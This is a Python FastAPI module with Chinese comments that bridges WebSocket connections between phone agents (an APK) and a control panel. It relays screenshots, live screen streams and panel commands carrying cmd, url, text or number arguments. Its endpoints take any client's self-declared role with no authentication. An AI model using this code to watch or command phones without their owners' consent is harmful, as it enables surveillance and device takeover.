"""Cinder / WebSocket 网关兼容层
====================================
给现有 main.py 补上：
    GET  /api/agents      -> 已连接的 Agent 列表
    WS   /ws              -> APK / 面板长连接（{t,d} 简写协议）
    WS   /api/agents/ws   -> 同上，备用路径

用法：把本文件放到 main.py 同级目录，在 main.py 末尾追加 1 行即可：

    try:
        from wss_bridge import register as _wb
        _wb(app)
    except Exception as _e:
        print("wss_bridge skipped:", _e)

用 try 包住是故意的：即便本文件出错，也不会影响你现有服务正常启动。
"""

import json
import time
import asyncio

try:
    from fastapi import WebSocket, WebSocketDisconnect
except Exception:  # pragma: no cover
    WebSocket = None
    WebSocketDisconnect = None


# ------------------------------------------------------------------
# 连接表（模块级，进程内唯一）
# ------------------------------------------------------------------
AGENTS: dict[str, WebSocket] = {}     # agentId -> ws
PANELS: set = set()                   # 面板 ws 集合
FRAMES: dict[str, dict] = {}          # agentId -> 最近一帧 {"b64":..,"ts":..}
CMDS: list[dict] = []                 # 指令流水（审计用）


def _now() -> int:
    return int(time.time())


def _log(msg: str) -> None:
    print(f"[wss_bridge] {msg}", flush=True)


# ------------------------------------------------------------------
# 从 main.py 里尽量拿到真实对象，拿不到就用上面的兜底表
# ------------------------------------------------------------------
def _grab_main():
    """返回 (DEVICES, CMD_MAP, do_dispatch) 三个可调用/可写对象，缺失处用 None。"""
    devices = None
    cmd_map = None
    dispatch = None
    try:
        import main as _m  # 自身被 main 导入时不会重复执行
        devices = getattr(_m, "DEVICES", None) or getattr(_m, "AGENTS", None)
        cmd_map = getattr(_m, "CMD_MAP", None)
        dispatch = getattr(_m, "_dispatch", None) or getattr(_m, "dispatch", None)
    except Exception as e:
        _log(f"import main failed, use builtin table: {e}")
    return devices, cmd_map, dispatch


# ------------------------------------------------------------------
# 指令执行：兼容多种协议写法
# ------------------------------------------------------------------
async def _run_action(action: str, d: dict, agent_id: str = "") -> dict:
    """把面板/APK 发来的指令落到后端。"""
    if not action:
        return {"ok": False, "err": "empty action"}

    # 参数从任意常见字段里取，避免上游把参数塞在 args/value/text/cmd/url/number
    args = (d.get("args", d.get("value", d.get("text",
            d.get("cmd", d.get("url", d.get("number", "")))))))

    _, _cmd_map, dispatch = _grab_main()

    rec = {"action": action, "args": args, "agent": agent_id, "ts": _now()}
    CMDS.append(rec)
    if len(CMDS) > 500:
        del CMDS[:200]

    if dispatch is not None:
        try:
            r = dispatch(action, _agent=agent_id,
                         value=args, text=args, cmd=args, url=args)
            if asyncio.iscoroutine(r):
                r = await r
            return r if isinstance(r, dict) else {"ok": True, "ret": r}
        except Exception as e:
            _log(f"dispatch error: {e}")

    # 兜底：只记流水，不真的执行（保证链路先通）
    _log(f"cmd queued (no dispatcher): {action} {args}")
    return {"ok": True, "executed": False, "action": action, "note": "no dispatcher"}


# ------------------------------------------------------------------
# 单条连接处理
# ------------------------------------------------------------------
async def _handle(ws, role: str, agent_id: str) -> None:
    # 注册
    if role == "agent" and agent_id:
        AGENTS[agent_id] = ws
        _log(f"agent online: {agent_id}")
    elif role == "panel":
        PANELS.add(ws)

    try:
        while True:
            try:
                raw = await asyncio.wait_for(ws.receive_text(), timeout=25)
            except asyncio.TimeoutError:
                try:
                    await ws.send_text(json.dumps({"t": "ping", "ts": _now()}))
                except Exception:
                    break
                continue

            if not raw:
                continue
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if not isinstance(msg, dict):
                continue

            # 心跳
            if msg.get("t") == "ping" or msg.get("type") == "ping":
                try:
                    await ws.send_text(json.dumps({"t": "pong", "ts": _now()}))
                except Exception:
                    break
                continue

            mtype = msg.get("t") or msg.get("type") or ""
            d = msg.get("d") if isinstance(msg.get("d"), dict) else {}

            # ---- APK -> 后端 ----
            if mtype in ("frame", "shot", "screenshot"):
                b64 = d.get("b64") or d.get("image") or msg.get("b64")
                if b64:
                    FRAMES[agent_id or "phone01"] = {"b64": b64, "ts": _now()}
                continue

            if mtype in ("log", "result", "state"):
                continue

            # ---- 面板 -> 手机 ----
            if mtype in ("cmd", "command", "action"):
                action = d.get("action") or msg.get("action") or ""
                r = await _run_action(action, d, agent_id)
                try:
                    await ws.send_text(json.dumps(
                        {"t": "result", "d": {"action": action, **r}},
                        ensure_ascii=False))
                except Exception:
                    pass
                continue

            if mtype in ("shot", "screenshot_req"):
                target = AGENTS.get(agent_id) or (list(AGENTS.values())[0] if AGENTS else None)
                if target is not None:
                    try:
                        await target.send_text(json.dumps({"t": "shot"}))
                    except Exception:
                        pass
                continue

            if mtype == "stream":
                on = bool(d.get("on", True))
                target = AGENTS.get(agent_id) or (list(AGENTS.values())[0] if AGENTS else None)
                if target is not None:
                    try:
                        await target.send_text(json.dumps(
                            {"t": "stream", "d": {"on": on, "fps": 8, "w": 540}}))
                    except Exception:
                        pass
                continue

            # 裸 action 写法：{"action":"home","value":""}
            if msg.get("action"):
                r = await _run_action(str(msg.get("action")), msg, agent_id)
                try:
                    await ws.send_text(json.dumps(
                        {"t": "result", "d": {"action": msg.get("action"), **r}},
                        ensure_ascii=False))
                except Exception:
                    pass

    except Exception as e:
        if WebSocketDisconnect is not None and not isinstance(e, WebSocketDisconnect):
            _log(f"loop error: {e}")
    finally:
        if role == "agent" and agent_id and AGENTS.get(agent_id) is ws:
            AGENTS.pop(agent_id, None)
            _log(f"agent offline: {agent_id}")
        elif role == "panel":
            PANELS.discard(ws)


# ------------------------------------------------------------------
# 对外注册
# ------------------------------------------------------------------
def register(app) -> None:
    if WebSocket is None:
        _log("fastapi WebSocket 不可用，跳过注册")
        return

    @app.get("/api/agents")
    async def _agents():
        names = list(AGENTS.keys())
        devices = None
        try:
            import main as _m
            devices = getattr(_m, "DEVICES", None) or getattr(_m, "AGENTS", None)
        except Exception:
            pass
        if names:
            return {"agents": names, "ts": _now()}
        if isinstance(devices, dict) and devices:
            return {"agents": list(devices.keys()), "ts": _now()}
        if isinstance(devices, list) and devices:
            return {"agents": [str(x) for x in devices], "ts": _now()}
        return {"agents": [], "ts": _now()}

    @app.websocket("/ws")
    async def _ws(ws: WebSocket):
        await ws.accept()
        role = ws.query_params.get("role", "panel")
        agent_id = ws.query_params.get("id", "") or ws.query_params.get("agent", "")
        await _handle(ws, role, agent_id)

    @app.websocket("/api/agents/ws")
    async def _ws_alias(ws: WebSocket):
        await ws.accept()
        role = ws.query_params.get("role", "panel")
        agent_id = ws.query_params.get("id", "") or ws.query_params.get("agent", "")
        await _handle(ws, role, agent_id)

    _log("registered: /api/agents, /ws, /api/agents/ws")
